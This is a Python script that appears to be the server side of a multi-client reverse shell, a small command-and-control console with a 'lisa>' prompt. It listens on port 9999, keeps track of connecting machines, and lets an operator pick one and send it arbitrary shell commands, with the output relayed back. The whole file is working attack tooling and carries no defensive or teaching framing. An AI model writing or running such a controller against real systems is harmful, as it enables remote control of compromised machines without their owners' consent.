import socket
import sys
import threading
import time
import queue

#thread 1 is for handling connections 
#thread 2 is to hanfle the clients once connected

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
q = queue.Queue()
all_connections = []
all_addresses = []


def create_socket():
    try:
        global port 
        global host 
        global s 
        host = ""
        port =9999
        s = socket.socket()
    except socket.error as msg:
        print("socket error" + str(msg))

def bind_socket():
    try:
        global port
        global host
        global s
        print("binding port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket error " + str(msg))
        bind_socket()

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection estabilished on address: " + address[0])

        except:
            print("Error estabilishing connection")

def send_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), 'utf-8')
                print(client_response, end = '')
        except:
            print("Invalid Command")
            break

def start_lisa():
    
    while True:
        cmd = input("lisa> ")
        if cmd == 'show':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_commands(conn)
        else:
            print("Command not recognised")

def get_target(cmd):
    try:
        my_cmd = cmd.split(' ')
        idx = int(my_cmd[1])
        print("You are now connected to :" + str(all_addresses[idx][0]))
        print(str(all_addresses[idx][0]) + "> ", end = '')
        return all_connections[idx]
    except:
        print("Selection is not valid")
        return None

def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('   '))
            conn.recv(1024)
        except:
            del all_addresses[i]
            del all_connections[i]
            continue

        results += str(i) + "  " + str(all_addresses[i][0]) + "  " + str(all_addresses[i][1]) + "\n"
    
    print('----Connections----' + '\n' + results)




def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = q.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_lisa()
        q.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        q.put(x)
    
    q.join()


create_workers()
create_jobs()